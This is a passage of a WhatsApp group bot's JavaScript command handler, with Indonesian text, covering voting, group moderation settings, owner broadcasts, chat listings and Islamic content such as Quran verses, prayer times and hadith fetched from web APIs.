                mentions: menvote
             }
            Pajrin.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case '12345devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - untuk memulai voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You Have Voted'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus votes`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '👍🏻Up-Vote??🏻'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '👎🏻De-Vote👎🏻'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer:  `${global.fake}`,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            Pajrin.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case '12345cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - untuk memulai voting`
teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus votes


©${Pajrin.user.id}
`
Pajrin.sendTextWithMentions(m.chat, teks_vote, m)
break
		case '12345deletevote': case '12345delvote': case '12345hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai voting`
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
case '12345groupsystem': case '12345groupsetting': case '12345groupset': {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Group chat system & setting`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Pilih menu di bawah ini",
								"rows": [
									{
										"title": "Group ⭕Open⭕ ",
										"description": `Mengizinkan semua member mengirim pesan di group`,
										"rowId": `${prefix}groupopen open`
									},
									{
										"title": "Group 🚫Close🚫",
										"description": `Hanya admin yang dapat mengirim pesan di group`,
										"rowId": `${prefix}groupopen close`
									},
									{
										"title": "Antilink GC ❗ON❗",
										"description": `Member yang ngirim link group wa lain, auto di kick`,
										"rowId": `${prefix}antilink on`
									},
									{
										"title": "Antilink GC 🆓OFF🆓",
										"description": `Member bebas share link group lain`,
										"rowId": `${prefix}antilink off`
									},
										{
											"title": "Anti wa.me ❗ON❗",
										"description": `Yang ngirim link wa.me/ auto di kick`,
										"rowId": `${prefix}antiwame on`
										},
										{
											"title": "Anti wa.me 🆓OFF🆓",
										"description": `Bebas kirim link wa.me/`,
										"rowId": `${prefix}antiwame off`
										},
										{
											"title": "Mute 🔇ON🔇",
										"description": `Bot tidak akan merespon di group ini`,
										"rowId": `${prefix}mute on`
										},
										{
											"title": "Mute 🔊OFF🔊",
										"description": `Bot akan kembali merespon di group ini`,
										"rowId": `${prefix}mute off`
										},
										{
											"title": "Edit Info ⭕ON⭕",
										"description": `Semua perseta dapat merubah info group`,
										"rowId": `${prefix}editinfo open`
										},
										{
											"title": "Edit Info 🚫OFF🚫",
										"description": `Hanya admin yang dapat merubah info group`,
										"rowId": `${prefix}editinfo close`
										},
										{
											"title": "Antivirtex ⭕ON⭕",
										"description": `Member yang mengirim pesan lebih dari 15k karakter akan di kick`,
										"rowId": `${prefix}antivirtex on`
										},
										{
											"title": "Antivirtex 🚫OFF🚫",
										"description": `Anti virtex di matikan`,
										"rowId": `${prefix}antivirtex off`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
               case '12345groupopen': case '12345grupopen': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await Pajrin.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Successful Closing The Group`)).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await Pajrin.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Successful Opening The Group`)).catch((err) => reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: '.group open', buttonText: { displayText: '⭕Open⭕' }, type: 1 },
                        { buttonId: '.group close', buttonText: { displayText: '🚫Close🚫' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `Group Mode`,  `${global.fake}`, m)

             }
            }
            break
            case '12345editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await Pajrin.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await Pajrin.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Close Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: '.editinfo open', buttonText: { displayText: '⭕Open⭕' }, type: 1 },
                        { buttonId: '.editinfo close', buttonText: { displayText: '🚫Close🚫' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `Mode Edit Info`,  `${global.fake}`, m)

            }
            }
            break
case '12345antilink':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[0] === 'on') {
						if (isAntiLink) return reply('Already Activated')
						antilink.push(m.chat)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Successfully activated the antilink feature')
						Pajrin.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[0] === 'off') {
						if (!isAntiLink) return reply('Already Deactivated')
						var ini = antilink.indexOf(m.chat)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Successfully disabled antilink feature')
					} else if (!q){
 let buttons = [
                     {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
{buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF🚫'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: 'Pilih anti link group WhatsApp on/off' ,
                    footer: `Klik on untuk mengaktifkan\nKlik off untuk mematikan`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
					break 
					case '12345antiwame':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[0] === 'on') {
						if (isAntiWame) return reply('Already Activated')
						antiwame.push(m.chat)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
						reply('Successfully activated the anti wa.me feature')
						Pajrin.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[0] === 'off') {
						if (!isAntiWame) return reply('Already Deactivated')
						var ini = antiwame.indexOf(m.chat)
						antiwame.splice(ini, 1)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
						reply('Successfully disabled anti wa.me  feature')
					} else if (!q){
						let buttons = [
                     {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
{buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF🚫'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: 'Pilih anti wa.me on/off' ,
                    footer: `Klik on untuk mengaktifkan\nKlik off untuk mematikan`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
					break 
					case '12345antivirtex':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[0] === 'off') {
						if (isAntiVirtex) return reply('Already Deactivated')
						antivirtex.push(m.chat)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
						reply('Successfully disabel the antivirtex feature')
						//Pajrin.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[0] === 'on') {
						if (!isAntiVirtex) return reply('Already Activated')
						var ini = antivirtex.indexOf(m.chat)
						antivirtex.splice(ini, 1)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
						reply('Successfully activated the antivirtex feature')
					} else if (!q){
 let buttons = [
                     {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
{buttonId: `${prefix + command} off`, buttonText: {displayText: 'OFF🚫'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: 'Pilih anti Virtek on/off' ,
                    footer: `Klik on untuk mengaktifkan\nKlik off untuk mematikan`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
					break 
					
					   case '12345mute': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.chats[m.chat].mute) return reply(`Already activated`)
                db.chats[m.chat].mute = true
                reply(`${ `${global.botnma}`} has been muted in this group !`)
                } else if (args[0] === "off") {
                if (!db.chats[m.chat].mute) return reply(`Already deactivated`)
                db.chats[m.chat].mute = false
                reply(`${ `${global.botnma}`} has been unmuted in this group!`)
                } else {
                 let buttons = [
                        { buttonId: '.mute on', buttonText: { displayText: '⭕On⭕' }, type: 1 },
                        { buttonId: '.mute off', buttonText: { displayText: '❌Off❌' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, `Mute Bot`,  `${global.fake}`, m)
                }
             }
             break
            case '12345linkgroup': case '12345grouplink': case '12345gclink': case '12345linkgc': {            
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) return reply(`Bot must be admin first`)
                let response = await Pajrin.groupInviteCode(m.chat)
                Pajrin.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink of: ${groupMetadata.subject} Group`, m, { detectLink: true })
            }
            break
            case '12345ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Enter the enable/disable value, For Example ${prefix}ephemeral enable'
                if (args[0] === 'enable') {
                    await Pajrin.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await Pajrin.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
            case '12345delete': case '12345del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'The message was not sent by a bot!'
                Pajrin.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            
            break

            case '12345bcgc': case '12345bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `*Mana teks nya?*\n\_Contoh:_ ${prefix + command} Hello guys im WhatsApp bot in here`
                let getGroups = await Pajrin.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Send Broadcast To ${anu.length} Group Chat, Finish Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: `${global.medsos1}📍`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                callButton: {
                                    displayText: 'Owner Number👤',
                                    phoneNumber: `${global.pemilik}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '📶Bot Status📶',
                                    id: `${prefix}ping`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '</Menu>',
                                    id: `${prefix}menu`
                                }
                            }]
                      fatihgans = fs.readFileSync('./BotMedia/bcgc.jpg')
                      let txt = `「 ${global.botnma} Broadcast 」\n\n${text}`
                      Pajrin.send5ButImg(i, txt,  `${global.fake}`, fatihgans, btn)
                    }
                reply(`Successful Sending Broadcast To ${anu.length} Group(s)`)
            }
            break
            case '12345bc': case '12345broadcast': case '12345bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `*Mana teks nya?*\n\_Contoh:_ ${prefix + command} Hello guys im WhatsApp bot in here`
                let anu = await store.chats.all().map(v => v.id)
                reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} second`)
		for (let yoi of anu) {
		    await sleep(1500)
		                      let btn = [{
                                urlButton: {
                                    displayText: `${global.medsos1}📍`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                callButton: {
                                    displayText: 'Owner Number👤',
                                    phoneNumber: `${global.pemilik}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '📶Bot Status📶',
                                    id: `${prefix}ping`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '</Menu>',
                                    id: `${prefix}menu`
                                }
                            }]
                      fatihgans = fs.readFileSync('./BotMedia/bc.jpg')
                      let txt = `「 ${global.botnma} Broadcast 」\n\n${text}`
                      Pajrin.send5ButImg(yoi, txt, `Broadcast By ${global.ownernma}`, fatihgans, btn)
		}
		reply('Broadcast Success')
            }
            break

            case '12345chatinfo': {
                if (!m.quoted) reply('Reply to mesaage')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'The message was not sent by a bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Read' : 'Unread'}\n\n`
                }
                Pajrin.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case '12345q': case '12345quoted': {
		if (!m.quoted) return reply('Reply Message!!')
		let wokwol = await Pajrin.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return reply('The message you replied to does not contain a reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case '12345listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *PERSONAL CHAT LIST*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Name :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 Pajrin.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case '12345listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *GROUP CHAT LIST*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await Pajrin.groupMetadata(i)
                     teks += `⬡ *Name :* ${metadata.subject}\n⬡ *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n⬡ *Made :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Pajrin.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case '12345listonline': case '12345onlinelist': case '12345liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    Pajrin.sendText(m.chat, 'Online List:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
//[ Islam MENU]\\ apikey lolhuman
         case '12345listsurah': case '12345listsurat': case '12345surahlist':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${global.apilol}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    m.reply(ini_txt)
                    break                                
case '12345alquran': {
let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah/NomorAyat*\n_Contoh :_\n${prefix + command} 9\n${prefix + command} 9/128\n${prefix + command} 9/128-129`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
//throw `*Masukan nomor surah/nomor ayat*\n_Contoh :_ ${prefix + command} madiun`
                //    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                  } else {
                  urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${global.apilol}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    replay(ini_txt)
                    }
                    }
                    break
case '12345alquranmp3': case '12345alquranaudio': {
	let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah/NomorAyat*\n_Contoh :_\n${prefix + command} 9\n${prefix + command} 9/128`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
	} else {
		m.reply(mess.wait)
		links = `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=${global.apilol}`
Pajrin.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}, { quoted: m })
}
}
break
case '12345surahmp3': case '12345surahaudio': {
	let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah*\n_Contoh :_\n${prefix + command} 1`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
	} else {
		m.reply(mess.wait)
		links = `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=${global.apilol}`
Pajrin.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}, { quoted: m })
}
}
break
case '12345ayatmp3': case '12345ayataudio': {
	let buttons = [
                     {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                ]
                let buttonMessage = {
                    text: `*Masukan NomorSurah/NomorAyat*\n_Contoh :_\n${prefix + command} 2/255`,
                    footer: `Tombol untuk melihat list nomor surah`,
                    buttons: buttons,
                    headerType: 2
                }
                if (args.length < 1) {
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
	} else {
		m.reply(mess.wait)
		links = `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=${global.apilol}`
Pajrin.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}, { quoted: m })
}
}
break

         case '12345jadwalsholat':
                    if (!text) throw `*Masukan nama kabupaten/kota?*\n_Contoh :_ ${prefix + command} madiun`
                    daerah = args.join(" ")
get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${global.apilol}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.maghrib}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    replay(ini_txt)
                    break  
                    
             case '12345hadits': case '12345hadith': case '12345hadist': {
		if (!args[0]) throw `*Masukan hadist NomorHadits*
_Contoh:_
${prefix + command} bukhari 1
${prefix + command} abu-daud 1567

Opsi tersedia:
abu-daud
1 - 4590

ahmad
1 - 26363

bukhari
1 - 7008

darimi
1 - 3367

ibu-majah
1 - 4331

nasai
1 - 5662

malik
1 - 1594

muslim
1 - 5362`
		if (!args[1]) throw `*Masukan hadist NomorHadits*
_Contoh:_
${prefix + command} bukhari 1
${prefix + command} abu-daud 1567

Opsi tersedia:
abu-daud
1 - 4590

ahmad
1 - 26363

bukhari
1 - 7008

darimi
1 - 3367

ibu-majah
1 - 4331

nasai
1 - 5662

malik
1 - 1594

muslim
1 - 5362`
		try {
			m.reply(mess.wait)
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
replay(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		reply(`Hadith not found !`)
		}
		}
		break
case '12345niatsholat': case '12345niatshalat': case '12345niatsalat': case '12345sholatniat': {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Niat Shalat wajib 5 waktu`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Niat Shalat Wajib 5 Waktu",
								"rows": [
									{
										"title": "Niat Sholat Subuh",
										"description": `Bacaan niat shalat wajib subuh`,
										"rowId": `${prefix}niat2 subuh`
									},
									{
										"title": "Niat Sholat Dzuhur",
										"description": `Bacaan niat shalat wajib dzuhur`,
										"rowId": `${prefix}niat2 dzuhur`
									},
									{
										"title": "Niat Sholat Ashar",
										"description": `Bacaan niat shalat wajib ashar`,
										"rowId": `${prefix}niat2 ashar`
									},
										{
											"title": "Niat Sholat Maghrib",
										"description": `Bacaan niat shalat wajib maghrib`,
										"rowId": `${prefix}maghrib`
										},
										{
											"title": "Niat Sholat Isya",
										"description": `Bacaan niat shalat wajib isya`,
										"rowId": `${prefix}niat2 isya`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
        case '12345niat2': {
        if (!text) throw `*Niat shalat apa?*\n_Contoh :_ ${prefix + command} subuh`
        	let res = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${text}?apikey=${global.apilol}`)
        replay(`*〔 ${res.result.name} 〕*
${res.result.ar}

${res.result.latin}

${res.result.id}`)
}
break
case '12345maghrib': {
        	
        replay(`*〔 Niat Sholat Maghrib 〕*
أُصَلِّى فَرْضَ المَغْرِبِ ثَلاَثَ رَكَعاَتٍ مُسْتَقْبِلَ الْقِبْلَةِ أَدَاءً لله تَعَالَى.

Ushallii fardhal maghribi tsalaatsa raka’aatin mustaqbilal qiblati adaa’an lilaahi ta’aalaa.

"Saya (berniat) mengerjakan sholat fardhu maghrib tiga raka’at dengan menghadap kiblat karena Allah Ta’ala."`)
}
break
case '12345asmaulhusna': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy *〔 Random Nama-Nama Baik ALLAH 〕*
                    
⭔ Latin : ${anu.result.latin}
⭔ Arab : ${anu.result.ar}
⭔ ID : ${anu.result.id}
⭔ en : ${anu.result.en}
⭔ No : ${anu.result.index}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: `*〔 Random Nama-Nama Baik ALLAH 〕*
                    
⭔ Latin : ${anu.result.latin}
⭔ Arab : ${anu.result.ar}
⭔ ID : ${anu.result.id}
⭔ en : ${anu.result.en}
⭔ No : ${anu.result.index}`,
                    footer: `Asmaulhusna`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345kisah2': case '12345kisahnabi2': {
                if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    getresult = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${global.apilol}`)
                    get_result = getresult.result
                ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
               ini_txt += `Umur : ${get_result.age}\n`
                  ini_txt += `Tempat : ${get_result.place}\n`
                  ini_txt += `Story : \n${get_result.story}`
                    replay(ini_txt)
                    }
                    break
case '12345kisahnabi': case '12345kisahrasul': case '12345rasulkisah': case '12345nabikisah': {
	//if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} dasar anak tiktok suka pargoy di tempat umum`
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Berikut list 25 Nabi dan Rasul`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_pilih untuk melihat kisahnya_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "25 Nabi dan Rasul yang wajib diketahui",
								"rows": [
									{
										"title": "Nabi Adam As",
										"description": `Nabi Adam As merupakan manusia serta khalifah pertama yang diciptakan Allah SWT dari segumpal tanah.`,
										"rowId": `${prefix}kisah2 adam`
									},
									{
										"title": "Nabi Idris AS",
										"description": `Beliau merupakan Nabi pertama yang diangkat Allah dari garis keturunan Nabi Adam As.`,
										"rowId": `${prefix}kisah2 idris`
									},
									{
										"title": "Nabi Nuh AS",
										"description": `Mukjizat Nabi Nuh As satu di antaranya membuat bahtera besar, untuk menyelamatkan kaumnya dan binatang dari banjir bandang.`,
										"rowId": `${prefix}kisah2 nuh`
									},
									{
										"title": "Nabi Hud AS",
										"description": `Beliau diutus untuk mengajak kaum Aad berhenti menyembah berhala. Nabi Hud mengajak kaum Aad untuk menyembah kepada Allah.`,
										"rowId": `${prefix}kisah2 hud`
									},
									{
										"title": "Nabi Sholeh AS",
										"description": `Mukjizat yang diberikan Allah oleh Nabi Sholeh As, yakni seekor unta betina yang lahir dari celah-celah batu.`,
										"rowId": `${prefix}kisah2 sholeh`
									},
									{
										"title": "Nabi Ibrahim AS",
										"description": `Nabi Ibrahim atau "Bapak para nabi" memiliki satu di antara mukjizat dari Allah SWT untuk membangun Ka'bah.`,
										"rowId": `${prefix}kisah2 ibrahim`
									},
									{
										"title": "Nabi Luth AS",
										"description": `Nabi Luth As merupakan keponakan Nabi Ibrahim As. Beliau diutus Allah bagi kaum Sodom dan Gomorrah yang memiliki perilaku seks menyimpang.`,
										"rowId": `${prefix}kisah2 Luth`
									},
									{
										"title": "Nabi Ismail AS",
										"description": `Beliau merupakan putra dari Nabi Ibrahim dan Siti Hajar. Beliau bersama-sama membangun Ka’bah dengan ayahnya yang saat ini menjadi pusat peribadatan kaum Muslim di seluruh dunia.`,
										"rowId": `${prefix}kisah2 Ismail`
									},
									{
										"title": "Nabi Ishaq AS",
										"description": `Nabi Ishaq merupakan putra kedua dari Nabi Ibrahim As dan beliau merupakan adik Nabi Ismail As.`,
										"rowId": `${prefix}kisah2 ishak`
									},
									{
										"title": "Nabi yaqub AS",
										"description": `Nabi Yakub As merupakan anak Nabi Ishaq As. Beliau digambarkan sebagai sosok dengan keimanan yang luar biasa.`,
										"rowId": `${prefix}kisah2 yakub`
									},
									{
										"title": "Nabi Yusuf AS",
